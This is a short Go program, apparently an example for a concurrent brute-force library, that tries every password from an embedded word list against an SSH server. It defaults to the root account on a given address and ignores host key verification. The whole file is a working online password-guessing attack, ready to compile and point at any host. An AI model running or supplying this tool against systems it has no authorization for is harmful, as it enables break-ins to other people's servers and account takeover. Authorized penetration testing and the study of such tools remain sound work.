package main

import (
	_ "embed"
	"flag"
	"fmt"
	"github.com/hanbufei/brutepool"
	"golang.org/x/crypto/ssh"
	"net"
	"strings"
)

//go:embed testpass
var pass string

var (
	Addr string
	User string
)

func TrySSHLogin(passwd interface{}) bool {
	fmt.Printf(">Check %s [%s/%s] .\n", Addr, User, passwd.(string))
	sshConfig := &ssh.ClientConfig{
		User:            User,
		Auth:            []ssh.AuthMethod{ssh.Password(passwd.(string))},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	var dialer net.Dialer
	conn, err := dialer.Dial("tcp", Addr)
	if err != nil {
		return false
	}
	defer conn.Close()

	client, _, _, err := ssh.NewClientConn(conn, Addr, sshConfig)
	if err == nil {
		client.Close()
		return true
	}
	return false
}

func main() {
	flag.StringVar(&Addr, "addr", "127.0.0.1:22", "address")
	flag.StringVar(&User, "u", "root", "user")
	flag.Parse()
	passList := strings.Split(pass, "\n")
	bruteList := make([]interface{}, len(passList), len(passList))
	for i := range passList {
		bruteList[i] = passList[i]
	}
	p := brutepool.New(bruteList, TrySSHLogin)
	p.Run()
}
